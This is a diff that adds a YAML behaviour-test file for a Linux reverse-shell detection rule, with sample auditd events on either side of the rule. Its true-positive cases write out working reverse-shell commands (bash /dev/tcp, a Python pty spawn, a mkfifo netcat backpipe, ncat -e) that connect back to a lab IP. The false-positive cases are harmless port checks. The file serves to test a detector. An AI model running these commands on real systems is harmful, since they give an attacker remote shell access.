@@ -1,0 +1,74 @@
+# Behaviour tests for lnx_reverse_shell_spawn.yml
+# Events model auditd execve records normalised by the Wazuh Linux decoder.
+
+rule: lnx_reverse_shell_spawn.yml
+
+true_positives:
+
+  - name: Classic bash /dev/tcp reverse shell
+    event:
+      Computer: siem.nexus.lab
+      Image: /usr/bin/bash
+      CommandLine: bash -i >& /dev/tcp/10.13.37.40/4444 0>&1
+      User: www-data
+      ParentImage: /usr/sbin/apache2
+
+  - name: Python socket-to-shell one-liner
+    event:
+      Computer: siem.nexus.lab
+      Image: /usr/bin/python3
+      CommandLine: >-
+        python3 -c "import socket,os,pty;s=socket.socket();s.connect(('10.13.37.40',9001));
+        [os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn('/bin/bash')"
+      User: nobody
+      ParentImage: /usr/bin/php-fpm
+
+  - name: mkfifo and netcat backpipe
+    event:
+      Computer: siem.nexus.lab
+      Image: /usr/bin/bash
+      CommandLine: rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.13.37.40 4444 > /tmp/f
+      User: vagrant
+      ParentImage: /usr/bin/bash
+
+  - name: netcat with the -e execute flag
+    event:
+      Computer: siem.nexus.lab
+      Image: /usr/bin/ncat
+      CommandLine: ncat 10.13.37.40 4444 -e /bin/bash
+      User: root
+      ParentImage: /usr/bin/bash
+
+false_positives:
+
+  - name: Monitoring script using /dev/tcp as a port check
+    event:
+      Computer: siem.nexus.lab
+      Image: /usr/bin/bash
+      CommandLine: timeout 1 bash -c "cat < /dev/tcp/10.13.37.10/389" &>/dev/null && echo open
+      User: nagios
+      ParentImage: /usr/lib/nagios/plugins/check_tcp
+
+  - name: Ordinary netcat port scan with no shell
+    event:
+      Computer: siem.nexus.lab
+      Image: /usr/bin/nc
+      CommandLine: nc -zv 10.13.37.10 389 636 3268
+      User: vagrant
+      ParentImage: /usr/bin/bash
+
+  - name: Python script that opens a socket without dup2
+    event:
+      Computer: siem.nexus.lab
+      Image: /usr/bin/python3
+      CommandLine: python3 -c "import socket; s=socket.socket(); s.connect(('10.13.37.10',389)); print('ok')"
+      User: vagrant
+      ParentImage: /usr/bin/bash
+
+  - name: Interactive bash login
+    event:
+      Computer: siem.nexus.lab
+      Image: /usr/bin/bash
+      CommandLine: -bash
+      User: vagrant
+      ParentImage: /usr/sbin/sshd
